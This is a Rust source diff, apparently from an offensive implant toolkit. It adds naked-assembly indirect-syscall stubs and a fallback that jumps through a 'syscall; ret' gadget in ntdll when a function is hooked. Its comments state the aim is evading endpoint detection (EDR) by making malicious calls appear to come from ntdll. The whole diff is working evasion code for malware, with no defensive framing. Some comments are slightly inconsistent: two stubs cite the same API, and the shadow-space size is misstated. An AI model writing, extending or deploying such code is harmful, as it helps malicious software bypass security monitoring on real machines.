@@ -180,8 +180,15 @@ pub unsafe fn resolve(entry: &SyscallEntry, api_hash: u32) -> Result<(u16, usize
         // Hooked — scan neighbours
         halos_gate(ntdll, func)?
     };
-    // Find the `syscall` (0x0F 0x05) instruction inside this stub or near it.
-    let syscall_addr = find_syscall_insn(func).unwrap_or(func as usize + 0x12);
+    // Locate a `syscall; ret` instruction. If the target stub is clean we
+    // use its own; if hooked we route through a universal gadget elsewhere
+    // in ntdll so the actual syscall instruction still belongs to ntdll —
+    // never to BOF .text. This keeps the call-stack legible to EDR.
+    let syscall_addr = match find_syscall_insn(func) {
+        Some(a) => a,
+        None => crate::evasion::find_universal_syscall_gadget(ntdll)
+            .ok_or(SyscallError::HookedAndNoNeighbour)?,
+    };
 
     entry.ssn.store(ssn, Ordering::Release);
     entry.syscall_addr.store(syscall_addr, Ordering::Release);
@@ -269,6 +276,71 @@ pub unsafe extern "system" fn do_syscall4(
         "mov eax, dword ptr [rsp + 0x28]",           // EAX = SSN  (arg4, low word)
         "jmp r11",                                    // jump into ntdll's `syscall; ret`
     );
+}
+
+/// 5-arg syscall (e.g. NtQueryInformationProcess, NtQuerySystemInformation
+/// when 5th arg is non-null ReturnLength).
+///
+/// Args 0-3 in registers, arg4 at [rsp+0x28], ssn at [rsp+0x30],
+/// syscall_addr at [rsp+0x38]. The kernel reads arg4 from [rsp+0x28]
+/// directly (already there), so we only need to shuffle ssn/syscall_addr
+/// out of the way.
+#[naked]
+pub unsafe extern "system" fn do_syscall5(
+    _arg0: usize, _arg1: usize, _arg2: usize, _arg3: usize,
+    _arg4: usize,
+    _ssn: u16,    _syscall_addr: usize,
+) -> NTSTATUS {
+    core::arch::naked_asm!(
+        "mov r10, rcx",
+        "mov r11, qword ptr [rsp + 0x38]",
+        "mov eax, dword ptr [rsp + 0x30]",
+        "jmp r11",
+    );
+}
+
+/// 6-arg syscall (e.g. NtCreateThreadEx).
+#[naked]
+pub unsafe extern "system" fn do_syscall6(
+    _arg0: usize, _arg1: usize, _arg2: usize, _arg3: usize,
+    _arg4: usize, _arg5: usize,
+    _ssn: u16,    _syscall_addr: usize,
+) -> NTSTATUS {
+    core::arch::naked_asm!(
+        "mov r10, rcx",
+        "mov r11, qword ptr [rsp + 0x40]",
+        "mov eax, dword ptr [rsp + 0x38]",
+        "jmp r11",
+    );
+}
+
+/// 10-arg syscall (e.g. NtCreateThreadEx).
+///
+/// Caller (Windows ABI) places args 4..9 at [rsp+0x28..rsp+0x50] (24 bytes
+/// shadow + 6 stack args), ssn at [rsp+0x58], syscall_addr at [rsp+0x60].
+/// The kernel reads stack args 4..9 from the same offsets, so we only need
+/// to shuffle SSN and the gadget address out of the way.
+#[naked]
+pub unsafe extern "system" fn do_syscall10(
+    _arg0: usize, _arg1: usize, _arg2: usize, _arg3: usize,
+    _arg4: usize, _arg5: usize, _arg6: usize, _arg7: usize,
+    _arg8: usize, _arg9: usize,
+    _ssn: u16,    _syscall_addr: usize,
+) -> NTSTATUS {
+    core::arch::naked_asm!(
+        "mov r10, rcx",
+        "mov r11, qword ptr [rsp + 0x60]",
+        "mov eax, dword ptr [rsp + 0x58]",
+        "jmp r11",
+    );
+}
+
+/// Convenience: resolve SSN + syscall instruction address from an api hash,
+/// using a one-shot SyscallEntry. Prefer the `resolve()` form with a static
+/// `SyscallEntry` for hot paths (caches across calls).
+pub unsafe fn resolve_ssn(api_hash: u32) -> Result<(u16, usize), SyscallError> {
+    let entry = SyscallEntry::new();
+    resolve(&entry, api_hash)
 }
 
 #[macro_export]
